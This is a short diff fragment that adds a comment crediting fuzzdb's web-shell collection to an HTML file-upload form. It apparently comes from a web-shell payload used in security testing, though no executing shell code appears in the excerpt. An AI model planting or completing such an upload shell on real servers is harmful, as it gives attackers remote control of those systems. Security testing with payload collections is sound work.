@@ -1,3 +1,4 @@
+<? //from fuzzdb-webshell ?>
 <html><body>
 <form enctype="multipart/form-data" action="" method="post">
 <input type="hidden" name="MAX_FILE_SIZE" value="1000000">
